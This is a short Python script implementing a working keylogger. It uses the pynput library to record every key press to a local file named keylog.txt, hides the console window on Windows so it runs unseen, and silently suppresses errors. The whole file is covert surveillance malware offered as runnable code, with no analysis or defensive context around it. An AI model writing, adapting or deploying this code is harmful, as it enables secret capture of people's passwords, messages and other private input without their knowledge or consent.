import sys
import ctypes  # For hiding the console on Windows
from pynput import keyboard

# Function to handle each key press
def on_press(key):
    try:
        # Log the key to a file (e.g., keylog.txt in the current directory)
        with open("keylog.txt", "a") as log_file:
            log_file.write(str(key) + "\n")  # Write the key as a string
    except Exception as e:
        pass  # Silently ignore any errors (e.g., file access issues)

# Main function to start the keylogger
def start_keylogger():
    # Hide the console window if on Windows
    if sys.platform == "win32":
        try:
            # Get the console window and hide it
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass  # If this fails, continue silently
    
    # Set up the keyboard listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # This will run indefinitely in the background

if __name__ == "__main__":
    start_keylogger()
